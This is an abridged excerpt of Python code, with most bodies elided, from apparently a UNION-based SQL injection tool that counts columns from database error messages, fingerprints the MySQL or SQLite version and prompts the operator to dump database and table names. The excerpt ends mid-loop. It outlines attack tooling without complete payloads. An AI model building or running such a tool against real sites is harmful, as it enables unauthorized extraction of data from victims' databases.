...
def send_payload_n_compare(base_url, vector, attack, param, query, number_of_column, old_html, result, db_engine,
                           method):
...
def detect_number_of_columns(base_url, vector, attack, method):
    ...
    while True:
        ...
        if "The used SELECT statements have a different number of columns" in r.text \
                or "SELECTs to the left and right of UNION do not have the same number of result columns" in r.text:
            result_nbr += 1
            continue
        return result_nbr
...
def print_version_db(base_url, vector, attack, number_of_column, old_html, result, db_test, method):
    ...
    for nbr in range(number_of_column - 1):
        if db_test == "mysql":
            ...
            param.append('null')
    payload = craft_union_payload(vector, attack, param, "-- ", method)
    # print(f"sending payload [{payload}]")
    r = perform_requests(base_url, payload, method)
    new_html = r.text.splitlines(keepends=True)
    diff_html(old_html, new_html, result)
...
def ask_user_db():
    database = 'undefined'
    user_input = input("\nWhats DB is this ? Type mysql(mariadb) or sqlite: ")
...
def dump_all_databases_name(base_url, vector, attack, number_of_column, old_html, result, db_engine, method):
    ...
    if db_engine == "mysql":
        ...
        sys.exit(42)
    send_payload_n_compare(base_url, vector, attack, param, query, number_of_column, old_html, result, db_engine,
                           method)
...
def union_based_inject(base_url, vector, attack, result, method):
    ...
    result.append('Version of database engine:')
    ...
    if db_engine == 'undefined':
        print("- LOG: Cant handle this db_engine type")
        return
    ...
    uinput = input("\nPlease input all database name show separated by a comma: ")
    if uinput == '':
        print("- LOG: Aborting...")
        return
    ...
    if db_engine == "mysql":
        ...
        for database in db_names:
            ...
            uinput = input("\nPlease input all tables name separated by a comma: ")
            if uinput == '':
